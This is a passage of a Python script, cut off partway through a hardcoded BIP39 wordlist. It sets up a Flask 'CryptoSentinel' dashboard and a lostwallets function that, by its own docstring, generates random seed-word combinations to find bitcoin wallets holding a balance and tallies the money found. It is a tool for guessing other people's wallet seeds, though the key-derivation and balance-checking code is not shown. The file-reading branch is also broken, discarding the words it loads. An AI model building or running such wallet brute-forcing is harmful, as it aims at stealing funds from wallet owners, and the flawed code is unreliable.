# Import required libraries
import itertools
# Generate all possible combinations of a given iterable
import random
# Generate random numbers
from bitcoinlib.wallets import Wallet
# Handle bitcoin wallets
import tkinter as tk
# Create a Tkinter interface
from tkinter import ttk
# Create a ttk interface
from colorama import Fore, init
# Initialize colorama
# Colorama is a Python library for printing colored text and colored terminal
# It also provides autoreset feature which resets the color to default after
# each print
from flask import Flask, render_template_string, jsonify
# Flask is a web framework that allows you to create web applications
# It provides a set of functions and classes to handle requests and responses
# render_template_string is a function that renders a template string
# jsonify is a function that returns a json response
from flask.sansio.scaffold import F
# This is a module that provides a set of functions and classes to handle
# requests and responses
import matplotlib.pyplot as plt
# Matplotlib is a Python library for creating static, animated, and interactive
# visualizations in Python
import io
# This is a module that provides a set of functions and classes to handle
# input/output operations
import base64
# This is a module that provides a set of functions and classes to handle
# encoding and decoding of binary data into text
import time
# This is a module that provides a set of functions and classes to handle
# time-related operations
from colorama import Back, Style
# Colorama is a Python library for printing colored text and colored terminal
# It also provides autoreset feature which resets the color to default after
# each print
from random import randint
# This is a function that generates a random integer
from threading import Thread, Lock
# This is a module that provides a set of functions and classes to handle
# threading operations
# It provides a set of functions and classes to handle synchronization of
# threads

# Initialize colorama
init(autoreset=True)

# Global variables
found_wallets = []
# A list that stores all the wallets that have been found
found_wallets_no_balance = []
# A list that stores all the wallets that do not have any balance
money = 0
# A variable that stores the total amount of money in all the wallets
lock = Lock()
# A variable that stores a lock object to be used for synchronization
started_time = time.time()
# A variable that stores the time when the program started

# Global variables for Tkinter
root = None
# A variable that stores the root window of the Tkinter interface
right_frame_top = None
# A variable that stores the top right frame of the Tkinter interface
right_frame_bottom = None
# A variable that stores the bottom right frame of the Tkinter interface

# Flask app
app = Flask(__name__)


@app.route('/data')
def get_data():
  # This function returns a json response with the data of all the wallets
  # It is called when the user requests the /data endpoint
  with lock:
    # This is a context manager that acquires the lock before executing the
    # code and releases the lock after the code has been executed
    data = {
        "found_wallets": found_wallets,
        # A key that stores the list of all the wallets that have been found
        "found_wallets_no_balance": found_wallets_no_balance,
        # A key that stores the list of all the wallets that do not have any
        # balance
        "wallets_with_balance_count": len(found_wallets),
        # A key that stores the number of wallets that have any balance
        "wallets_no_balance_count": len(found_wallets_no_balance),
        # A key that stores the number of wallets that do not have any balance
        "money": money
        # A key that stores the total amount of money in all the wallets
    }
  return jsonify(data)


@app.route('/')
def index():
    # This function returns an html response with the interface of the
    # application
    # It is called when the user requests the / endpoint
    html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoSentinel Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-color, #f5f5f5);
            color: var(--text-color, #000);
            margin: 0;
            padding: 0;
            transition: background 0.3s, color 0.3s;
        }}
        header {{
            background: #343a40;
            color: #fff;
            padding: 10px;
            text-align: center;
        }}
        .container {{
            padding: 20px;
            max-width: 1200px;
            margin: auto;
        }}
        .stats {{
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
        }}
        .stat-card {{
            background: var(--card-bg, #fff);
            margin: 10px;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            flex: 1 1 20%;
            transition: background 0.3s;
        }}
        .stat-card h2 {{
            margin: 0;
            font-size: 1.2em;
        }}
        .stat-card p {{
            font-size: 1.8em;
            color: #17a2b8;
        }}
        .chart-container {{
            max-width: 800px;
            margin: 20px auto;
        }}
         .controls {{
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
            align-items: center;
        }}
        .toggle-switch {{
            position: relative;
            width: 50px;
            height: 25px;
            background: #ccc;
            border-radius: 25px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        .toggle-switch:before {{
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            background: #fff;
            border-radius: 50%;
            top: 2.5px;
            left: 2.5px;
            transition: transform 0.3s;
        }}
        .toggle-switch.active {{
            background: #007bff;
        }}
        .toggle-switch.active:before {{
            transform: translateX(25px);
        }}

        .dark-mode {{
            background: #333;
            color: #fff;
        }}
    </style>
</head>
<body>
    <header>
        <h1>CryptoSentinel Dashboard</h1>
    </header>
    <div class="container">
        <div class="controls">
            <div class="toggle-switch" id="toggleMode"></div>
            <div id="clock">Loading current time...</div>
        </div>
        <div class="stats">
            <div class="stat-card">
                <h2>Wallets with Balance</h2>
                <p id="wallets-balance">Loading...</p>
            </div>
            <div class="stat-card">
                <h2>Wallets with No Balance</h2>
                <p id="wallets-no-balance">Loading...</p>
            </div>
            <div class="stat-card">
                <h2>Total Money (BTC)</h2>
                <p id="total-money">Loading...</p>
            </div>
            <div class="stat-card">
                <h2>BTC to Local Currency</h2>
                <p id="btc-to-currency">Loading...</p>
            </div>
        </div>
        <div class="chart-container">
            <canvas id="walletChart"></canvas>
        </div>
        <div>
            <h3>Last Updated: <span id="last-updated">0s ago</span></h3>
        </div>
    </div>
    <script>
        let lastUpdateTime = Date.now();

        // Function to update clock
        const updateClock = () => {{
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString();
        }};

        // Function to fetch data from the API and update the UI
        const fetchData = async () => {{
            try {{
                const response = await fetch('/data');
                const data = await response.json();
                const currencyCode = Intl.NumberFormat().resolvedOptions().locale.split('-')[1]; // Get user's country code

                // Update wallet stats
                document.getElementById('wallets-balance').innerText = data.wallets_with_balance_count;
                document.getElementById('wallets-no-balance').innerText = data.wallets_no_balance_count;
                document.getElementById('total-money').innerText = data.money;

                // Fetch real-time BTC to local currency conversion
                const btcResponse = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=${{currencyCode}}`);
                const btcData = await btcResponse.json();
                document.getElementById('btc-to-currency').innerText = `${{btcData.bitcoin[currencyCode]}} ${{currencyCode}}`;

                // Update last updated time
                lastUpdateTime = Date.now();

                // Update chart
                updateChart(data.wallets_with_balance_count, data.wallets_no_balance_count);
            }} catch (error) {{
                console.error('Error fetching data:', error);
            }}
        }};

        // Function to update the countdown for the last update
        const updateLastUpdated = () => {{
            const secondsAgo = Math.floor((Date.now() - lastUpdateTime) / 1000);
            document.getElementById('last-updated').innerText = `${{secondsAgo}}s ago`;
        }};

        // Initialize Chart.js
        const ctx = document.getElementById('walletChart').getContext('2d');
        const walletChart = new Chart(ctx, {{
            type: 'doughnut',
            data: {{
                labels: ['With Balance', 'No Balance'],
                datasets: [{{
                    data: [0, 0],
                    backgroundColor: ['#007bff', '#6c757d']
                }}]
            }},
            options: {{ responsive: true }}
        }});

        // Function to update the chart
        const updateChart = (balance, noBalance) => {{
            walletChart.data.datasets[0].data = [balance, noBalance];
            walletChart.update();
        }};

        // Toggle dark/light mode
        const toggleMode = () => {{
            const root = document.documentElement;
            const toggleSwitch = document.getElementById('toggleMode');
            const isDark = root.style.getPropertyValue('--bg-color') === '#333';

            root.style.setProperty('--bg-color', isDark ? '#f5f5f5' : '#333');
            root.style.setProperty('--text-color', isDark ? '#000' : '#fff');
            root.style.setProperty('--card-bg', isDark ? '#fff' : '#444');

            toggleSwitch.classList.toggle('active');
        }};

        document.getElementById('toggleMode').addEventListener('click', toggleMode);

        // Update data and UI periodically
        setInterval(fetchData, 5000);
        setInterval(updateLastUpdated, 1000);
        setInterval(updateClock, 1000);

        // Fetch data on page load
        fetchData();
        updateClock();
    </script>
</body>
</html>
    """
    return render_template_string(html)


# Flask thread
def start_flask_app():
  """
  Start the Flask web server in a separate thread
  """
  app.run(debug=False, host="127.0.0.1", port=8080)

flask_thread = Thread(target=start_flask_app)
flask_thread.daemon = True

# Function to add items to the boxes
def add_to_box(box, content):
  """
  Add a label to the given box with the given content
  """
  ttk.Label(box, text=content).pack(anchor="w", padx=5, pady=2)


def lostwallets(filename, r=24, num_combinations=1, visualize=False):
  """
  Generate random combinations of words and check for wallets with a balance

  :param filename: file containing words to generate combinations from
  :param r: number of words to use in each combination
  :param num_combinations: number of combinations to generate
  :param visualize: whether to display the results using Tkinter
  """

  #You can set if you want to read out the words from the txt, even a coustume txt or just the pre-set list
  from_file = True

  if from_file:
    # Read words from file
    # Open the file and read all the lines into a list
    with open(filename, 'r') as file:
      words = [line.strip() for line in file.readlines()]

    # Check if there are enough words to generate combinations from
    if len(words) < r:
      # If not, print an error message and return
      print(
          f"Error: Not enough words. The file contains only {len(words)} words.")
      return
    else:
      #List of words pre-set
      words = ["abandon",
              "ability",
              "able",
              "about",
              "above",
              "absent",
              "absorb",
              "abstract",
              "absurd",
              "abuse",
              "access",
              "accident",
              "account",
              "accuse",
              "achieve",
              "acid",
              "acoustic",
              "acquire",
              "across",
              "act",
              "action",
              "actor",
              "actress",
              "actual",
              "adapt",
              "add",
              "addict",
              "address",
              "adjust",
              "admit",
              "adult",
              "advance",
              "advice",
              "aerobic",
              "affair",
              "afford",
              "afraid",
              "again",
              "age",
              "agent",
              "agree",
              "ahead",
              "aim",
              "air",
              "airport",
              "aisle",
              "alarm",
              "album",
              "alcohol",
              "alert",
              "alien",
              "all",
              "alley",
              "allow",
              "almost",
              "alone",
              "alpha",
              "already",
              "also",
              "alter",
              "always",
              "amateur",
              "amazing",
              "among",
              "amount",
              "amused",
              "analyst",
              "anchor",
              "ancient",
              "anger",
              "angle",
              "angry",
              "animal",
              "ankle",
              "announce",
              "annual",
              "another",
              "answer",
              "antenna",
              "antique",
              "anxiety",
              "any",
              "apart",
              "apology",
              "appear",
              "apple",
              "approve",
              "april",
              "arch",
              "arctic",
              "area",
              "arena",
              "argue",
              "arm",
              "armed",
              "armor",
              "army",
              "around",
              "arrange",
              "arrest",
              "arrive",
              "arrow",
              "art",
              "artefact",
              "artist",
              "artwork",
              "ask",
              "aspect",
              "assault",
              "asset",
              "assist",
              "assume",
              "asthma",
              "athlete",
              "atom",
              "attack",
              "attend",
              "attitude",
              "attract",
              "auction",
              "audit",
              "august",
              "aunt",
              "author",
              "auto",
              "autumn",
              "average",
              "avocado",
              "avoid",
              "awake",
              "aware",
              "away",
              "awesome",
              "awful",
              "awkward",
              "axis",
              "baby",
              "bachelor",
              "bacon",
              "badge",
              "bag",
              "balance",
              "balcony",
              "ball",
              "bamboo",
              "banana",
              "banner",
              "bar",
              "barely",
              "bargain",
              "barrel",
              "base",
              "basic",
              "basket",
              "battle",
              "beach",
              "bean",
              "beauty",
              "because",
              "become",
              "beef",
              "before",
              "begin",
              "behave",
              "behind",
              "believe",
              "below",
              "belt",
              "bench",
              "benefit",
              "best",
              "betray",
              "better",
              "between",
              "beyond",
              "bicycle",
              "bid",
              "bike",
              "bind",
              "biology",
              "bird",
              "birth",
              "bitter",
              "black",
              "blade",
              "blame",
              "blanket",
              "blast",
              "bleak",
              "bless",
              "blind",
              "blood",
              "blossom",
              "blouse",
              "blue",
              "blur",
              "blush",
              "board",
              "boat",
              "body",
              "boil",
              "bomb",
              "bone",
              "bonus",
              "book",
              "boost",
              "border",
              "boring",
              "borrow",
              "boss",
              "bottom",
              "bounce",
              "box",
              "boy",
              "bracket",
              "brain",
              "brand",
              "brass",
              "brave",
              "bread",
              "breeze",
              "brick",
              "bridge",
              "brief",
              "bright",
              "bring",
              "brisk",
              "broccoli",
              "broken",
              "bronze",
              "broom",
              "brother",
              "brown",
              "brush",
              "bubble",
              "buddy",
              "budget",
              "buffalo",
              "build",
              "bulb",
              "bulk",
              "bullet",
              "bundle",
              "bunker",
              "burden",
              "burger",
              "burst",
              "bus",
              "business",
              "busy",
              "butter",
              "buyer",
              "buzz",
              "cabbage",
              "cabin",
              "cable",
              "cactus",
              "cage",
              "cake",
              "call",
              "calm",
              "camera",
              "camp",
              "can",
              "canal",
              "cancel",
              "candy",
              "cannon",
              "canoe",
              "canvas",
              "canyon",
              "capable",
              "capital",
              "captain",
              "car",
              "carbon",
              "card",
              "cargo",
              "carpet",
              "carry",
              "cart",
              "case",
              "cash",
              "casino",
              "castle",
              "casual",
              "cat",
              "catalog",
              "catch",
              "category",
              "cattle",
              "caught",
              "cause",
              "caution",
              "cave",
              "ceiling",
              "celery",
              "cement",
              "census",
              "century",
              "cereal",
              "certain",
              "chair",
              "chalk",
              "champion",
              "change",
              "chaos",
              "chapter",
              "charge",
              "chase",
              "chat",
              "cheap",
              "check",
              "cheese",
              "chef",
              "cherry",
              "chest",
              "chicken",
              "chief",
              "child",
              "chimney",
              "choice",
              "choose",
              "chronic",
              "chuckle",
              "chunk",
              "churn",
              "cigar",
              "cinnamon",
              "circle",
              "citizen",
              "city",
              "civil",
              "claim",
              "clap",
              "clarify",
              "claw",
              "clay",
              "clean",
              "clerk",
              "clever",
              "click",
              "client",
              "cliff",
              "climb",
              "clinic",
              "clip",
              "clock",
              "clog",
              "close",
              "cloth",
              "cloud",
              "clown",
              "club",
              "clump",
              "cluster",
              "clutch",
              "coach",
              "coast",
              "coconut",
              "code",
              "coffee",
              "coil",
              "coin",
              "collect",
              "color",
              "column",
              "combine",
              "come",
              "comfort",
              "comic",
              "common",
              "company",
              "concert",
              "conduct",
              "confirm",
              "congress",
              "connect",
              "consider",
              "control",
              "convince",
              "cook",
              "cool",
              "copper",
              "copy",
              "coral",
              "core",
              "corn",
              "correct",
              "cost",
              "cotton",
              "couch",
              "country",
              "couple",
              "course",
              "cousin",
              "cover",
              "coyote",
              "crack",
              "cradle",
              "craft",
              "cram",
              "crane",
              "crash",
              "crater",
              "crawl",
              "crazy",
              "cream",
              "credit",
              "creek",
              "crew",
              "cricket",
              "crime",
              "crisp",
              "critic",
              "crop",
              "cross",
              "crouch",
              "crowd",
              "crucial",
              "cruel",
              "cruise",
              "crumble",
              "crunch",
              "crush",
              "cry",
              "crystal",
              "cube",
              "culture",
              "cup",
              "cupboard",
              "curious",
              "current",
              "curtain",
              "curve",
              "cushion",
              "custom",
              "cute",
              "cycle",
              "dad",
              "damage",
              "damp",
              "dance",
              "danger",
              "daring",
              "dash",
              "daughter",
              "dawn",
              "day",
              "deal",
              "debate",
              "debris",
              "decade",
              "december",
              "decide",
              "decline",
              "decorate",
              "decrease",
              "deer",
              "defense",
              "define",
              "defy",
              "degree",
              "delay",
              "deliver",
              "demand",
              "demise",
              "denial",
              "dentist",
              "deny",
              "depart",
              "depend",
              "deposit",
              "depth",
              "deputy",
              "derive",
              "describe",
              "desert",
              "design",
              "desk",
              "despair",
              "destroy",
              "detail",
              "detect",
              "develop",
              "device",
              "devote",
              "diagram",
              "dial",
              "diamond",
              "diary",
              "dice",
              "diesel",
              "diet",
              "differ",
              "digital",
              "dignity",
              "dilemma",
              "dinner",
              "dinosaur",
              "direct",
              "dirt",
              "disagree",
              "discover",
              "disease",
              "dish",
              "dismiss",
              "disorder",
              "display",
              "distance",
              "divert",
              "divide",
              "divorce",
              "dizzy",
              "doctor",
              "document",
              "dog",
              "doll",
              "dolphin",
              "domain",
              "donate",
              "donkey",
              "donor",
              "door",
              "dose",
              "double",
              "dove",
              "draft",
              "dragon",
              "drama",
              "drastic",
              "draw",
              "dream",
              "dress",
              "drift",
              "drill",
              "drink",
              "drip",
              "drive",
              "drop",
              "drum",
              "dry",
              "duck",
              "dumb",
              "dune",
              "during",
              "dust",
              "dutch",
              "duty",
              "dwarf",
              "dynamic",
              "eager",
              "eagle",
              "early",
              "earn",
              "earth",
              "easily",
              "east",
              "easy",
              "echo",
              "ecology",
              "economy",
              "edge",
              "edit",
              "educate",
              "effort",
              "egg",
              "eight",
              "either",
              "elbow",
              "elder",
              "electric",
              "elegant",
              "element",
              "elephant",
              "elevator",
              "elite",
              "else",
              "embark",
              "embody",
              "embrace",
              "emerge",
              "emotion",
              "employ",
              "empower",
              "empty",
              "enable",
              "enact",
              "end",
              "endless",
              "endorse",
              "enemy",
              "energy",
              "enforce",
              "engage",
              "engine",
              "enhance",
              "enjoy",
              "enlist",
              "enough",
              "enrich",
              "enroll",
              "ensure",
              "enter",
              "entire",
              "entry",
              "envelope",
              "episode",
              "equal",
              "equip",
              "era",
              "erase",
              "erode",
              "erosion",
              "error",
              "erupt",
              "escape",
              "essay",
              "essence",
              "estate",
              "eternal",
              "ethics",
              "evidence",
              "evil",
              "evoke",
              "evolve",
              "exact",
              "example",
              "excess",
              "exchange",
              "excite",
              "exclude",
              "excuse",
              "execute",
              "exercise",
              "exhaust",
              "exhibit",
              "exile",
              "exist",
              "exit",
              "exotic",
              "expand",
              "expect",
              "expire",
              "explain",
              "expose",
              "express",
              "extend",
              "extra",
              "eye",
              "eyebrow",
              "fabric",
              "face",
              "faculty",
              "fade",
              "faint",
              "faith",
              "fall",
              "false",
              "fame",
              "family",
              "famous",
              "fan",
              "fancy",
              "fantasy",
              "farm",
              "fashion",
              "fat",
              "fatal",
              "father",
              "fatigue",
              "fault",
              "favorite",
              "feature",
              "february",
              "federal",
              "fee",
              "feed",
              "feel",
              "female",
              "fence",
              "festival",
              "fetch",
              "fever",
              "few",
              "fiber",
              "fiction",
              "field",
              "figure",
              "file",
              "film",
              "filter",
              "final",
              "find",
              "fine",
              "finger",
              "finish",
              "fire",
              "firm",
              "first",
              "fiscal",
              "fish",
              "fit",
              "fitness",
              "fix",
              "flag",
              "flame",
              "flash",
              "flat",
              "flavor",
              "flee",
              "flight",
              "flip",
              "float",
              "flock",
              "floor",
              "flower",
              "fluid",
              "flush",
              "fly",
              "foam",
              "focus",
              "fog",
              "foil",
              "fold",
              "follow",
              "food",
              "foot",
              "force",
              "forest",
              "forget",
              "fork",
              "fortune",
              "forum",
              "forward",
              "fossil",
              "foster",
              "found",
              "fox",
              "fragile",
              "frame",
              "frequent",
              "fresh",
              "friend",
              "fringe",
              "frog",
              "front",
              "frost",
              "frown",
              "frozen",
              "fruit",
              "fuel",
              "fun",
              "funny",
              "furnace",
              "fury",
              "future",
              "gadget",
              "gain",
              "galaxy",
              "gallery",
              "game",
              "gap",
              "garage",
              "garbage",
              "garden",
              "garlic",
              "garment",
              "gas",
              "gasp",
              "gate",
              "gather",
              "gauge",
              "gaze",
              "general",
              "genius",
              "genre",
              "gentle",
              "genuine",
              "gesture",
              "ghost",
              "giant",
              "gift",
              "giggle",
              "ginger",
              "giraffe",
              "girl",
              "give",
              "glad",
              "glance",
              "glare",
              "glass",
              "glide",
              "glimpse",
              "globe",
              "gloom",
              "glory",
              "glove",
              "glow",
              "glue",
              "goat",
              "goddess",
              "gold",
              "good",
              "goose",
              "gorilla",
              "gospel",
              "gossip",
              "govern",
              "gown",
              "grab",
              "grace",
              "grain",
              "grant",
              "grape",
              "grass",
              "gravity",
              "great",
              "green",
              "grid",
              "grief",
              "grit",
              "grocery",
              "group",
              "grow",
              "grunt",
              "guard",
              "guess",
              "guide",
              "guilt",
              "guitar",
              "gun",
              "gym",
              "habit",
              "hair",
              "half",
              "hammer",
              "hamster",
              "hand",
              "happy",
              "harbor",
              "hard",
              "harsh",
              "harvest",
              "hat",
              "have",
              "hawk",
              "hazard",
              "head",
              "health",
              "heart",
              "heavy",
              "hedgehog",
              "height",
              "hello",
              "helmet",
              "help",
              "hen",
              "hero",
              "hidden",
              "high",
              "hill",
              "hint",
              "hip",
              "hire",
              "history",
              "hobby",
              "hockey",
              "hold",
              "hole",
              "holiday",
              "hollow",
              "home",
              "honey",
              "hood",
              "hope",
              "horn",
              "horror",
              "horse",
              "hospital",
              "host",
              "hotel",
              "hour",
              "hover",
              "hub",
              "huge",
              "human",
              "humble",
              "humor",
              "hundred",
              "hungry",
              "hunt",
              "hurdle",
              "hurry",
              "hurt",
              "husband",
              "hybrid",
              "ice",
              "icon",
              "idea",
              "identify",
              "idle",
              "ignore",
              "ill",
              "illegal",
              "illness",
              "image",
              "imitate",
              "immense",
              "immune",
              "impact",
              "impose",
              "improve",
              "impulse",
              "inch",
              "include",
              "income",
              "increase",
              "index",
              "indicate",
              "indoor",
              "industry",
              "infant",
              "inflict",
              "inform",
              "inhale",
              "inherit",
              "initial",
              "inject",
              "injury",
              "inmate",
              "inner",
              "innocent",
              "input",
              "inquiry",
              "insane",
              "insect",
              "inside",
              "inspire",
              "install",
              "intact",
              "interest",
              "into",
              "invest",
              "invite",
              "involve",
              "iron",
              "island",
              "isolate",
              "issue",
              "item",
              "ivory",
              "jacket",
              "jaguar",
              "jar",
              "jazz",
              "jealous",
              "jeans",
              "jelly",
              "jewel",
              "job",
              "join",
              "joke",
              "journey",
              "joy",
              "judge",
              "juice",
              "jump",
              "jungle",
              "junior",
              "junk",
              "just",
              "kangaroo",
              "keen",
              "keep",
              "ketchup",
              "key",
              "kick",
              "kid",
              "kidney",
              "kind",
              "kingdom",
              "kiss",
              "kit",
              "kitchen",
              "kite",
              "kitten",
              "kiwi",
              "knee",
              "knife",
              "knock",
              "know",
              "lab",
              "label",
              "labor",
              "ladder",
              "lady",
              "lake",
              "lamp",
              "language",
              "laptop",
              "large",
              "later",
              "latin",
              "laugh",
              "laundry",
              "lava",
              "law",
              "lawn",
              "lawsuit",
              "layer",
              "lazy",
              "leader",
              "leaf",
              "learn",
              "leave",
              "lecture",
              "left",
              "leg",
              "legal",
              "legend",
              "leisure",
              "lemon",
              "lend",
              "length",
              "lens",
              "leopard",
              "lesson",
              "letter",
              "level",
              "liar",
              "liberty",
              "library",
              "license",
              "life",
              "lift",
              "light",
              "like",
              "limb",
              "limit",
              "link",
              "lion",
              "liquid",
              "list",
              "little",
              "live",
              "lizard",
              "load",
              "loan",
              "lobster",
              "local",
              "lock",
              "logic",
              "lonely",
              "long",
              "loop",
              "lottery",
              "loud",
              "lounge",
              "love",
              "loyal",
              "lucky",
              "luggage",
              "lumber",
              "lunar",
              "lunch",
              "luxury",
              "lyrics",
              "machine",
              "mad",
              "magic",
              "magnet",
              "maid",
              "mail",
              "main",
              "major",
              "make",
              "mammal",
              "man",
              "manage",
              "mandate",
              "mango",
              "mansion",
              "manual",
              "maple",
              "marble",
              "march",
              "margin",
              "marine",
              "market",
              "marriage",
              "mask",
              "mass",
              "master",
              "match",
              "material",
              "math",
              "matrix",
              "matter",
              "maximum",
              "maze",
              "meadow",
              "mean",
              "measure",
              "meat",
              "mechanic",
              "medal",
              "media",
              "melody",
              "melt",
              "member",
              "memory",
              "mention",
              "menu",
              "mercy",
              "merge",
              "merit",
              "merry",
              "mesh",
              "message",
              "metal",
              "method",
              "middle",
              "midnight",
              "milk",
              "million",
              "mimic",
              "mind",
              "minimum",
              "minor",
              "minute",
              "miracle",
              "mirror",
              "misery",
              "miss",
              "mistake",
              "mix",
              "mixed",
              "mixture",
              "mobile",
              "model",
              "modify",
              "mom",
              "moment",
              "monitor",
              "monkey",
              "monster",
              "month",
              "moon",
              "moral",
              "more",
              "morning",
              "mosquito",
              "mother",
              "motion",
              "motor",
              "mountain",
              "mouse",
              "move",
              "movie",
              "much",
              "muffin",
              "mule",
              "multiply",
              "muscle",
              "museum",
              "mushroom",
              "music",
              "must",
              "mutual",
              "myself",
              "mystery",
              "myth",
              "naive",
              "name",
              "napkin",
              "narrow",
              "nasty",
              "nation",
              "nature",
              "near",
              "neck",
              "need",
              "negative",
              "neglect",
              "neither",
              "nephew",
              "nerve",
              "nest",
              "net",
              "network",
              "neutral",
              "never",
              "news",
              "next",
              "nice",
              "night",
              "noble",
              "noise",
              "nominee",
              "noodle",
              "normal",
              "north",
              "nose",
              "notable",
              "note",
              "nothing",
              "notice",
              "novel",
              "now",
              "nuclear",
              "number",
              "nurse",
              "nut",
              "oak",
              "obey",
              "object",
              "oblige",
              "obscure",
              "observe",
              "obtain",
              "obvious",
              "occur",
              "ocean",
              "october",
              "odor",
              "off",
              "offer",
              "office",
              "often",
              "oil",
              "okay",
              "old",
              "olive",
              "olympic",
              "omit",
              "once",
              "one",
              "onion",
              "online",
              "only",
              "open",
              "opera",
              "opinion",
              "oppose",
              "option",
              "orange",
              "orbit",
              "orchard",
              "order",
              "ordinary",
              "organ",
              "orient",
              "original",
              "orphan",
              "ostrich",
              "other",
              "outdoor",
              "outer",
              "output",
              "outside",
              "oval",
              "oven",
              "over",
              "own",
              "owner",
              "oxygen",
              "oyster",
              "ozone",
              "pact",
              "paddle",
              "page",
              "pair",
              "palace",
              "palm",
              "panda",
              "panel",
              "panic",
              "panther",
              "paper",
              "parade",
              "parent",
              "park",
              "parrot",
              "party",
              "pass",
              "patch",
              "path",
              "patient",
              "patrol",
              "pattern",
              "pause",
              "pave",
              "payment",
              "peace",
              "peanut",
              "pear",
              "peasant",
              "pelican",
              "pen",
              "penalty",
              "pencil",
              "people",
              "pepper",
              "perfect",
              "permit",
              "person",
              "pet",
              "phone",
              "photo",
              "phrase",
              "physical",
              "piano",
              "picnic",
              "picture",
              "piece",
              "pig",
              "pigeon",
              "pill",
              "pilot",
              "pink",
              "pioneer",
              "pipe",
              "pistol",
              "pitch",
              "pizza",
              "place",
              "planet",
              "plastic",
              "plate",
              "play",
              "please",
              "pledge",
              "pluck",
              "plug",
              "plunge",
              "poem",
              "poet",
              "point",
              "polar",
              "pole",
              "police",
              "pond",
              "pony",
              "pool",
              "popular",
              "portion",
              "position",
              "possible",
              "post",
              "potato",
              "pottery",
              "poverty",
              "powder",
              "power",
              "practice",
              "praise",
              "predict",
              "prefer",
              "prepare",
              "present",
              "pretty",
              "prevent",
              "price",
              "pride",
              "primary",
              "print",
              "priority",
              "prison",
              "private",
              "prize",
              "problem",
              "process",
              "produce",
              "profit",
              "program",
              "project",
              "promote",
              "proof",
              "property",
              "prosper",
              "protect",
              "proud",
              "provide",
              "public",
              "pudding",
              "pull",
              "pulp",
              "pulse",
              "pumpkin",
              "punch",
              "pupil",
              "puppy",
              "purchase",
              "purity",
              "purpose",
              "purse",
              "push",
              "put",
              "puzzle",
              "pyramid",
              "quality",
              "quantum",
              "quarter",
              "question",
              "quick",
              "quit",
              "quiz",
              "quote",
              "rabbit",
              "raccoon",
              "race",
              "rack",
              "radar",
              "radio",
              "rail",
              "rain",
              "raise",
              "rally",
              "ramp",
              "ranch",
              "random",
              "range",
              "rapid",
              "rare",
              "rate",
              "rather",
              "raven",
              "raw",
              "razor",
              "ready",
              "real",
              "reason",
              "rebel",
              "rebuild",
              "recall",
              "receive",
              "recipe",
              "record",
              "recycle",
              "reduce",
              "reflect",
              "reform",
              "refuse",
              "region",
              "regret",
              "regular",
              "reject",
              "relax",
              "release",
              "relief",
              "rely",
              "remain",
              "remember",
              "remind",
              "remove",
              "render",
              "renew",
              "rent",
              "reopen",
              "repair",
              "repeat",
              "replace",
              "report",
              "require",
              "rescue",
              "resemble",
              "resist",
              "resource",
              "response",
              "result",
              "retire",
              "retreat",
              "return",
              "reunion",
              "reveal",
              "review",
              "reward",
              "rhythm",
              "rib",
              "ribbon",
              "rice",
              "rich",
              "ride",
              "ridge",
              "rifle",
              "right",
              "rigid",
              "ring",
              "riot",
              "ripple",
              "risk",
              "ritual",
              "rival",
              "river",
              "road",
              "roast",
              "robot",
              "robust",
              "rocket",
              "romance",
              "roof",
              "rookie",
              "room",
              "rose",
              "rotate",
              "rough",
              "round",
              "route",
              "royal",
              "rubber",
              "rude",
              "rug",
              "rule",
              "run",
              "runway",
              "rural",
              "sad",
              "saddle",
              "sadness",
              "safe",
              "sail",
              "salad",
              "salmon",
              "salon",
              "salt",
              "salute",
              "same",
              "sample",
              "sand",
              "satisfy",
              "satoshi",
              "sauce",
              "sausage",
              "save",
              "say",
              "scale",
              "scan",
              "scare",
              "scatter",
              "scene",
              "scheme",
              "school",
              "science",
              "scissors",
              "scorpion",
              "scout",
              "scrap",
              "screen",
              "script",
              "scrub",
              "sea",
              "search",
              "season",
              "seat",
              "second",
              "secret",
              "section",
              "security",
              "seed",
              "seek",
              "segment",
              "select",
              "sell",
              "seminar",
              "senior",
              "sense",
              "sentence",
              "series",
              "service",
              "session",
              "settle",
              "setup",
              "seven",
              "shadow",
              "shaft",
              "shallow",
              "share",
              "shed",
              "shell",
              "sheriff",
              "shield",
              "shift",
              "shine",
              "ship",
              "shiver",
              "shock",
              "shoe",
              "shoot",
              "shop",
              "short",
              "shoulder",
              "shove",
              "shrimp",
              "shrug",
              "shuffle",
              "shy",
              "sibling",
              "sick",
              "side",
              "siege",
              "sight",
              "sign",
              "silent",
              "silk",
              "silly",
              "silver",
              "similar",
              "simple",
              "since",
              "sing",
              "siren",
              "sister",
              "situate",
              "six",
              "size",
              "skate",
              "sketch",
              "ski",
              "skill",
              "skin",
              "skirt",
              "skull",
              "slab",
              "slam",
              "sleep",
              "slender",
              "slice",
              "slide",
              "slight",
              "slim",
              "slogan",
              "slot",
              "slow",
              "slush",
              "small",
              "smart",
              "smile",
              "smoke",
              "smooth",
              "snack",
              "snake",
              "snap",
              "sniff",
              "snow",
              "soap",
              "soccer",
              "social",
              "sock",
              "soda",
              "soft",
              "solar",
              "soldier",
              "solid",
              "solution",
              "solve",
              "someone",
              "song",
              "soon",
              "sorry",
              "sort",
              "soul",
              "sound",
              "soup",
              "source",
              "south",
              "space",
              "spare",
              "spatial",
              "spawn",
              "speak",
              "special",
              "speed",
              "spell",
              "spend",
              "sphere",
              "spice",
              "spider",
              "spike",
              "spin",
              "spirit",
              "split",
              "spoil",
              "sponsor",
              "spoon",
              "sport",
              "spot",
              "spray",
              "spread",
              "spring",
              "spy",
              "square",
              "squeeze",
              "squirrel",
              "stable",
              "stadium",
              "staff",
              "stage",
              "stairs",
              "stamp",
              "stand",
              "start",
              "state",
              "stay",
              "steak",
              "steel",
              "stem",
              "step",
              "stereo",
              "stick",
              "still",
              "sting",
              "stock",
              "stomach",
              "stone",
              "stool",
              "story",
              "stove",
              "strategy",
              "street",
              "strike",
              "strong",
              "struggle",
              "student",
              "stuff",
              "stumble",
              "style",
              "subject",
              "submit",
